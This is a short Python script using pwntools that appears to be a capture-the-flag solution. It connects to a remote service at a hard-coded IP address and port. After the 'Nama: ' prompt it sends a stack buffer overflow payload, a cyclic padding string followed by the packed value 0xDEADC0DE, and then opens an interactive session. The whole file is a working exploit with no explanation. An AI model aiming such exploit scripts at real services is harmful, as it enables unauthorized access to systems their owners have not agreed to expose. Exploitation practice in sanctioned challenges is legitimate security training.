from pwn import *

host, port = "103.127.132.106", 5002

conn = remote(host, port)

payload = b"aaaaaaaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaab"

payload += p64(0xDEADC0DE)

conn.recvuntil("Nama: ")
conn.sendline(payload)

conn.interactive()
